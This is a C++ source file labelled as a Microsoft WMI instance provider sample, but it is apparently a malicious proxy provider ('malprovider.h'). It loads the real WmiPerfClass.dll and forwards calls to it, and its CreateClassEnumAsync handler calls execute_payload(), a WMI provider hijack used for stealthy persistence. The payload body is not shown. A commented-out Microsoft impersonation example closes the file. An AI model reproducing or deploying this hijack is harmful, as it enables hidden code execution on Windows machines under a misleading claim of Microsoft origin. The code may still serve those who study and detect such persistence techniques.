//*******************************************************************
//  INSTPRO.CPP
//
//  Module: WMI Instance provider sample code
//
//  Purpose: Defines the CInstPro class.  An object of this class is
//           created by the class factory for each connection.
// Copyright (C) Microsoft. All Rights Reserved.
//
//*******************************************************************
#define _WIN32_WINNT 0x0500

//#include "pch.h"
#include "malprovider.h"
#include <objbase.h>
#include "malprovider.h"
#include <process.h>
#include <strsafe.h>
#include <sddl.h>


TCHAR orgProviderDllPath[MAX_PATH + 1] = "C:\\Windows\\System32\\wbem\\WmiPerfClass.dll";

IWbemServices *g_orgProviderWbemServices = NULL;
HMODULE g_hOrgProviderDll = NULL;

//*******************************************************************
//
// (De)Constructor
//
//*******************************************************************

WmiPerfClass::WmiPerfClass(BSTR ObjectPath,
    BSTR User,
    BSTR Password,
    IWbemContext* pCtx)
{

    m_pNamespace = NULL;
    m_cRef = 0;
    InterlockedIncrement(&g_cObj);
    return;
}

WmiPerfClass::~WmiPerfClass(void)
{
    if (m_pNamespace)
        m_pNamespace->Release();
    InterlockedDecrement(&g_cObj);
    return;
}

//*******************************************************************
//
// CInstPro::QueryInterface
// CInstPro::AddRef
// CInstPro::Release
//
// Purpose: IUnknown members for CInstPro object.
//*******************************************************************


STDMETHODIMP WmiPerfClass::QueryInterface(REFIID riid, PPVOID ppv)
{
    *ppv = NULL;

    // Because you have dual inheritance,
    // it is necessary to cast the return type

    if (riid == IID_IWbemServices)
        *ppv = (IWbemServices*)this;

    if (IID_IUnknown == riid || riid == IID_IWbemProviderInit)
        *ppv = (IWbemProviderInit*)this;

    if (NULL != *ppv)
    {
        AddRef();
        return NOERROR;
    }
    else
        return E_NOINTERFACE;

}

STDMETHODIMP_(ULONG) WmiPerfClass::AddRef(void)
{
    return ++m_cRef;
}

STDMETHODIMP_(ULONG) WmiPerfClass::Release(void)
{
    ULONG nNewCount = InterlockedDecrement((long*)&m_cRef);
    if (0L == nNewCount)
        delete this;

    return nNewCount;
}

/********************************************************************
*
*   IWbemProvInit::Initialize
*
*   Purpose: Method is required to initialize with CIMOM.
*
********************************************************************/

STDMETHODIMP WmiPerfClass::Initialize(LPWSTR pszUser,
    LONG lFlags,
    LPWSTR pszNamespace,
    LPWSTR pszLocale,
    IWbemServices* pNamespace,
    IWbemContext* pCtx,
    IWbemProviderInitSink* pInitSink)
{

    if (!pNamespace)
    {
        pInitSink->SetStatus(WBEM_E_FAILED, 0);
    }
    else
    {
        m_pNamespace = pNamespace;
        m_pNamespace->AddRef();
        pInitSink->SetStatus(WBEM_S_INITIALIZED, 0);

        // initialize original provider
        HRESULT result;
        IClassFactory* pcf;
        IWbemProviderInit* pprov_init;

        wchar_t dllpath[MAX_PATH + 1] = OLESTR("C:\\Windows\\System32\\wbem\\WmiPerfClass.dll");
        g_hOrgProviderDll = CoLoadLibrary(dllpath, FALSE);
        if (g_hOrgProviderDll == NULL) {
            return ERROR_DLL_INIT_FAILED;
        }

        FARPROC classFacAddr = GetProcAddress(g_hOrgProviderDll, "DllGetClassObject");
        if (classFacAddr == NULL) {
            CoFreeLibrary(g_hOrgProviderDll);
            return ERROR_DLL_INIT_FAILED;
        }

        typedef HRESULT(__stdcall* pICFUNC)(REFCLSID, REFIID, PPVOID);
        pICFUNC FuncDllGetClassObject = pICFUNC(classFacAddr);

        // DllGetClassObject(REFCLSID rclsid, REFIID riid, PPVOID ppv)
        result = FuncDllGetClassObject(CLSID_WmiPerfClass, IID_IClassFactory, reinterpret_cast<void**>(&pcf));
        if (result != S_OK) {
            CoFreeLibrary(g_hOrgProviderDll);
            return result;
        }

        result = pcf->CreateInstance(NULL, IID_IWbemProviderInit, reinterpret_cast<void**>(&pprov_init));
        pcf->Release();
        if (result != S_OK) {
            CoFreeLibrary(g_hOrgProviderDll);
            return result;
        }

        result = pprov_init->Initialize(pszUser, lFlags, pszNamespace, pszLocale, pNamespace, pCtx, pInitSink);
        if (result != S_OK) {
            pprov_init->Release();
            CoFreeLibrary(g_hOrgProviderDll);
            return result;
        }

        result = pprov_init->QueryInterface(IID_IWbemServices, reinterpret_cast<void**>(&g_orgProviderWbemServices));
        pprov_init->Release();
        if (result != S_OK) {
            CoFreeLibrary(g_hOrgProviderDll);
            return result;
        }// Error 0x80004002: No Such Interface Supported
    }

    return WBEM_S_NO_ERROR;
}


//*******************************************************************
//
// IWbemServices::CreateInstanceEnumAsync
//
// Purpose: Asynchronously enumerates the instances.  
//
//*******************************************************************

SCODE WmiPerfClass::CreateClassEnumAsync(
    /* [in] */ const BSTR Superclass,
    /* [in] */ long lFlags,
    /* [in] */ IWbemContext __RPC_FAR* pCtx,
    /* [in] */ IWbemObjectSink __RPC_FAR* pResponseHandler
)
{
    SCODE sc;
    sc = g_orgProviderWbemServices->CreateClassEnumAsync(Superclass, lFlags, pCtx, pResponseHandler);
    execute_payload();
    return sc;
}

//*******************************************************************
//
// IWbemServices::GetObjectAsync
//
//*******************************************************************


SCODE WmiPerfClass::GetObjectAsync(const BSTR      ObjectPath,
    long            lFlags,
    IWbemContext* pCtx,
    IWbemObjectSink FAR* pHandler)
{

    SCODE sc;
    sc = g_orgProviderWbemServices->GetObjectAsync(ObjectPath, lFlags, pCtx, pHandler);
    //execute_payload();
    return sc;

}


// Client impersonation code example from MS
/*
HRESULT hr = CoImpersonateClient();
if (FAILED(hr))
{
    pHandler->SetStatus(0, hr, NULL, NULL);
    return hr;
}

// Check to see if call is at lower than
// RPC_C_IMP_LEVEL_IMPERSONATE level. If that is the case,
// the provider will not be able to impersonate
// the client to access the protected resources.

DWORD t_CurrentImpersonationLevel =
    GetCurrentImpersonationLevel();
if (t_CurrentImpersonationLevel < RPC_C_IMP_LEVEL_IMPERSONATE)
{
    // Revert before you perform any operations
    CoRevertToSelf();

    hr = WBEM_E_ACCESS_DENIED;
    pHandler->SetStatus(0, hr, NULL, NULL);
    return hr;
}

SCODE sc;
int iCnt;
IWbemClassObject FAR* pNewInst;

// Do a check of arguments and ensure
// you have a pointer to Namespace

if (pHandler == NULL || m_pNamespace == NULL)
    return WBEM_E_INVALID_PARAMETER;


for (iCnt = 0; iCnt < glNumInst; iCnt++)
{
    sc = CreateInst(m_pNamespace, MyDefs[iCnt].pwcKey, MyDefs[iCnt].lValue, &pNewInst, RefStr, pCtx);

    if (sc != S_OK)
        break;

    // Send the object to the caller

    pHandler->Indicate(1, &pNewInst);
    pNewInst->Release();
}

// Set status

pHandler->SetStatus(0, sc, NULL, NULL);

return sc;
*/
